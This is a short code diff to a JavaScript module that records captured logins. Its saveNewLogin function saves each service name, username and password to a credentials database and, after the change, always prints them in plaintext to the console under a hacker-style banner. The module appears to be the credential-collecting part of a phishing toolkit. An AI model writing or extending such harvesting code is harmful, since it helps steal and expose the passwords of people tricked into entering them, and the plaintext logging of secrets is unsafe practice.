@@ -4,9 +4,7 @@ const index = require('../index');
 const driver = require('./driver');
 
 exports.saveNewLogin = function (serviceName, username, password) {
-    if (!index.usingDatabase) {
-        console.info(`${chalk.green(`[!${chalk.red('|')}!]`)} New login from ${chalk.green(serviceName)} - Username: ${chalk.red(username)} Password: ${chalk.red(password)}`);
-    } else {
+    if (index.usingDatabase) {
         let newLogin = new driver.getModals().Creds({
             username: username,
             password: password,
@@ -14,4 +12,5 @@ exports.saveNewLogin = function (serviceName, username, password) {
         });
         newLogin.save();
     }
+    console.info(`${chalk.green(`[!${chalk.red('|')}!]`)} New login from ${chalk.green(serviceName)} - Username: ${chalk.red(username)} Password: ${chalk.red(password)}`);
 };
